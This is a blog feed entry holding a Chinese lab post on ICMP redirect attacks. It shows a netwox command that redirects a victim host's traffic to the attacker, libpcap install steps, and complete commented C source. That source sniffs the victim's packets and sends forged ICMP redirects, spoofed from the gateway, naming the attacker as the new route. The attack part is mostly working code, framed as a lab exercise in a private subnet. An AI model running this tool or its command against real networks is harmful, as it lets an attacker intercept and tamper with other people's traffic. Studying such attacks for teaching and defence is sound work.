<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>JKZhang</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://JKZhang.github.io/"/>
  <updated>2019-04-04T01:04:23.504Z</updated>
  <id>http://JKZhang.github.io/</id>
  
  <author>
    <name>JKZhang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://JKZhang.github.io/2019/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E2%80%94ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/"/>
    <id>http://JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/</id>
    <published>2019-04-03T16:07:52.826Z</published>
    <updated>2019-04-04T01:04:23.504Z</updated>
    
    <content type="html"><![CDATA[<p>title: 信息安全实战—ICMP重定向攻击<br>date: 2019-04-04 00:07:52<br>categories:<br>-信息安全<br>tags:<br>-计算机网络<br>-ICMP<br>-信息安全<br>-网络安全<br>-ip<br>-重定向</p><p>说明：</p><p>攻击者主机 192.168.18.43</p><p>受害者主机 192.168.18.44</p><p>网关 192.168.18.254</p><p>一、Netwox命令实现重定向</p><p>1、查看主机ICMP重定向是否开启</p><p><img src="//JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/1554308429434.png" alt="1554308429434"></p><p>2、开启ICMP重定向</p><p><img src="//JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/1554308449789.png" alt="1554308449789"></p><p>3、目前在受害者主机上ping网址正常</p><p><img src="//JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/1554308476656.png" alt="1554308476656"></p><p>4、netwox 86 -f “host 192.168.18.44” -g 192.168.18.43 -i 192.168.18.254 命令执行后 ping包重定向</p><p><img src="//JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/1554308488449.png" alt="1554308488449"></p><p>5、抓包</p><p> <img src="//JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/1554308511264.png" alt="1554308511264"></p><p><img src="//JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/1554308579169.png" alt="1554308579169"></p><p>二、安装pcap</p><p>1、安装系统依赖包 </p><p>apt-get install gcc libc6-dev </p><p>apt-get install m4 </p><p>apt-get install flex bison</p><p>2、下载libpcap源码包 </p><p><a href="http://www.tcpdump.org/" target="_blank" rel="noopener">http://www.tcpdump.org/</a></p><p>3、将libpcap源码包存放并解压到指定位置</p><p>tar -xf libpcap-1.9.0.tar.gz -C /usr/local/lib/libpcap/</p><p>4、编译安装 </p><p>./configure </p><p>make &amp;&amp; make install</p><p>5、可能需要在/etc/ld.so.conf 添加两行配置</p><p>改成如下 </p><p>include /etc/ld.so.conf.d/*.conf</p><p>include /usr/local/lib</p><p>include /usr/lib</p><p>三、ICMP重定向攻击源代码及分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pcap.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip_icmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATA_LEN 8    </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_ETHERNET 14</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAD_MAX 64</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> Vic_IP;   <span class="comment">//被攻击者IP</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> Ori_Gw_IP; <span class="comment">//网关IP</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> Redic_IP; <span class="comment">//攻击者IP</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint16_t</span> ip_id=<span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//参考 https://blog.csdn.net/wangzhen_csdn/article/details/80461269</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//计算校验和</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint16_t <span class="title">checksum</span><span class="params">(<span class="keyword">void</span> *buf,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> sum=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> *cbuf=buf;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(len&gt;<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        sum+=*cbuf++;</span><br><span class="line"></span><br><span class="line">        len-=<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(len)</span><br><span class="line"></span><br><span class="line">        sum+=*(<span class="keyword">u_int8_t</span> *)cbuf;</span><br><span class="line"></span><br><span class="line">    sum=(sum&gt;&gt;<span class="number">16</span>)+(sum &amp; <span class="number">0xffff</span>);</span><br><span class="line"></span><br><span class="line">    sum+=(sum&gt;&gt;<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ~sum;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPacket</span><span class="params">(u_char * arg, <span class="keyword">const</span> struct pcap_pkthdr * pkthdr, <span class="keyword">const</span> u_char * packet)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> sockfd,res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> one = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *ptr_one = &amp;one;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1:AF_INET参数 表示用于处理ip层的数据  2:SOCK_RAW 指定用原始套接字编程 3:指定icmp报文</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果 socket没有创建成功 会返回负值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))&lt;<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"create sockfd error\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//参数1：sockfd 要被设置或者获取选项的套接字 2:IP选项 </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3：IP_HDRINCL 如果没有开启IP_HDRINCL选项，那么内核会帮忙处理IP头部。如果设置了IP_HDRINCL选项，那么用户需要自己生成IP头部的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4:ptr_one 作为选项值的缓冲</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5: 选项值的长度</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, <span class="keyword">sizeof</span>(one));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(res &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error--\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span>*<span class="title">ipd</span>=(<span class="title">struct</span> <span class="title">iphdr</span>*)(<span class="title">packet</span>+<span class="title">SIZE_ETHERNET</span>);</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> re_size=(ipd-&gt;ihl&lt;&lt;<span class="number">2</span>)+DATA_LEN; <span class="comment">//获取首部长度5 左移两位 re_size 28 bytes</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> all_size=<span class="keyword">sizeof</span>(struct iphdr)+<span class="keyword">sizeof</span>(struct icmphdr)+re_size;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> <span class="title">ip</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">icmphdr</span> <span class="title">icmp</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">uint8_t</span> data[HEAD_MAX+DATA_LEN];</span><br><span class="line"></span><br><span class="line">        &#125;packet=&#123;</span><br><span class="line"></span><br><span class="line">            .ip=&#123;</span><br><span class="line"></span><br><span class="line">                .version = <span class="number">4</span>,</span><br><span class="line"></span><br><span class="line">                .ihl = <span class="number">5</span>, <span class="comment">//首部长度</span></span><br><span class="line"></span><br><span class="line">                .id=ip_id++,</span><br><span class="line"></span><br><span class="line">                .tos = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">                .tot_len = htons(all_size),  <span class="comment">//host to network long 网络字节序</span></span><br><span class="line"></span><br><span class="line">                .frag_off = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">                .ttl = <span class="number">255</span>,</span><br><span class="line"></span><br><span class="line">                .check = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">                .protocol = IPPROTO_ICMP,</span><br><span class="line"></span><br><span class="line">                .saddr = Ori_Gw_IP,</span><br><span class="line"></span><br><span class="line">     .daddr = Vic_IP</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">            .icmp=&#123;</span><br><span class="line"></span><br><span class="line">                .type = ICMP_REDIRECT,</span><br><span class="line"></span><br><span class="line">                .code = ICMP_REDIR_HOST,</span><br><span class="line"></span><br><span class="line">                .checksum = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">                .un=&#123;</span><br><span class="line"></span><br><span class="line">                    .gateway=Redic_IP</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">memcpy</span>(packet.data,ipd,re_size); <span class="comment">//memcpy 把构造的ip数据报放到packet.data中</span></span><br><span class="line"></span><br><span class="line">        packet.ip.check = checksum(&amp;packet.ip, <span class="keyword">sizeof</span>(packet.ip));</span><br><span class="line"></span><br><span class="line">        packet.icmp.checksum = checksum(&amp;packet.icmp, <span class="keyword">sizeof</span>(packet.icmp)+re_size);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest</span>=&#123;</span></span><br><span class="line"></span><br><span class="line">            .sin_family=AF_INET,</span><br><span class="line"></span><br><span class="line">            .sin_addr=&#123;</span><br><span class="line"></span><br><span class="line">                .s_addr=(Vic_IP)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        sendto(sockfd,&amp;packet,all_size,<span class="number">0</span>,(struct sockaddr *)&amp;dest,<span class="keyword">sizeof</span>(dest));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">char</span> *cmd,<span class="keyword">char</span> *out)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//popen 创建出一个管道，然后执行CMD命令，返回值为FILE* 指针类型，由于管道数据流是单向的，command只能产生stdout或者读取stdin</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// 参数'r' 表示CMD从管道中读取数据流，而w表示command的stdout输出到管道中</span></span><br><span class="line"></span><br><span class="line">    FILE *fp=popen(cmd,<span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//fscanf 是用于格式化输入到out中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,out);</span><br><span class="line"></span><br><span class="line">    pclose(fp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argv,<span class="keyword">char</span> *args[])</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    assert(argv==<span class="number">2</span>); <span class="comment">//asert 作用是判断条件argv==2 是否为真，如果为假 打印出错信息    因为在linux上运行shi ./filename ip_addr 判断 argv==2 </span></span><br><span class="line"></span><br><span class="line">    Vic_IP=inet_addr(args[<span class="number">1</span>]); <span class="comment">// 执行文件的时候传入 受害者IP地址      </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> errBuf[PCAP_ERRBUF_SIZE], * devStr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get a device */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取网络接口设备名,成功就返回设备名指针，失败的话返回NULL，同时,errbuf存放出错误信息字符串</span></span><br><span class="line"></span><br><span class="line">    devStr = pcap_lookupdev(errBuf);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(devStr)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"success: device: %s\n"</span>, devStr);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error: %s\n"</span>, errBuf);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ifconfig eth0 | awk '$1 ~/inet$/ &#123;print $2&#125;' | awk -F: '&#123;print $2&#125;'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//上面是一条Linux命令，用于截取ifconfig eth0 的IP地址 格式化输出到buf中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">"ifconfig %s|awk '$1 ~ /inet$/ &#123;print $2&#125;'|awk -F: '&#123;print $2&#125;'"</span>,devStr);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//run函数用于解析出 攻击者的IP 保存到char ip[16];</span></span><br><span class="line"></span><br><span class="line">    run(buf,ip);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    Redic_IP=inet_addr(ip);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打印攻击者的IP</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"get ip %s\n"</span>,ip);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//route|awk '$1 ~ /default/ &#123;print $2&#125;'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//上面是一条Linux命令，用于截取eth0的网关地址 格式化输出到buf中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">"route|awk '$1 ~ /default/ &#123;print $2&#125;'"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//同理 run函数用于解析出攻击者的网关 保存到char ip[16]中</span></span><br><span class="line"></span><br><span class="line">    run(buf,ip);</span><br><span class="line"></span><br><span class="line">    Ori_Gw_IP=inet_addr(ip);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"get gateway %s\n"</span>,ip);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* open a device, wait until a packet arrives */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据上一步获得的网络接口设备名 打开网络接口  参数1:网络接口的名字 2：捕获数据包的长度 3:开启混杂模式 4:指定等待毫秒数 0表示一直等待 直到有数据报 5:存储错误信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pcap_t</span> * device = pcap_open_live(devStr, <span class="number">65535</span>, <span class="number">1</span>, <span class="number">0</span>, errBuf);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置过滤条件</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">filter</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> filterstr[<span class="number">50</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//src host 指定只接受源IP是 被攻击者IP的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(filterstr,<span class="string">"src host %s"</span>,args[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//参数1： 上一步获得的设备接口指针 2、应用过滤条件 3、之前设置的过滤条件：即只接受源IP是被攻击者的IP地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4: 表示是否需要优化过滤表达式 1表示优化 5：mask 指定本地网络的网络掩码，不需要时写0</span></span><br><span class="line"></span><br><span class="line">    pcap_compile(device,&amp;filter,filterstr,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//应用过滤规则</span></span><br><span class="line"></span><br><span class="line">    pcap_setfilter(device,&amp;filter);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//参数：1：上一步获得的设备接口指针 2:指定捕获数据包的个数，一旦抓到了 cnt 个数据包，pcap_loop 立即返回。如果是 -1，就会永无休止的捕获，直到出现错误。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3:getPacket 回调函数，名字任意，根据需要自行起名。 4: 向回调函数中传递的参数 一般设置为NULL</span></span><br><span class="line"></span><br><span class="line">    pcap_loop(device, <span class="number">-1</span>, getPacket, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;title: 信息安全实战—ICMP重定向攻击&lt;br&gt;date: 2019-04-04 00:07:52&lt;br&gt;categories:&lt;br&gt;-信息安全&lt;br&gt;tags:&lt;br&gt;-计算机网络&lt;br&gt;-ICMP&lt;br&gt;-信息安全&lt;br&gt;-网络安全&lt;br&gt;-ip&lt;br&gt;-重定向
      
    
    </summary>
    
    
